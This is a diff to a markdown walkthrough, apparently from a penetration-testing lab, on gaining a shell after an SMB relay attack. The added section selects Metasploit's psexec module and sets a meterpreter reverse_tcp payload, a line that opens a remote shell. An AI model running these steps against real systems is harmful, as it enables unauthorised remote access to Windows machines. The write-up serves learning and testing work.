@@ -116,7 +116,13 @@ SMB relay attack with -c 'whoami' flag successful
 ## 🚩 Gaining Shell Access
 
 ### Metasploit module using psexec  
-[prior to completing this secion, we will need to conduct another SMB relay attack using impacket-ntlmrelayx without any swithces. Capture the NT and LM hashes with the specific users captured. When these are obtained we can then direct them into the MSF modules or manual exploits]
+In metasploit we have chosen the windoes/smb/psexec module  
+![image](https://github.com/user-attachments/assets/5a95bb0b-2ef1-4559-9047-239d20571096)  
+
+and set payload to x64 compatible as most* modern machines run x64.
+
+            set payload windows/x64/meterpreter/reverse_tcp
+
 
 ### Manual mode using psexec.py  
 
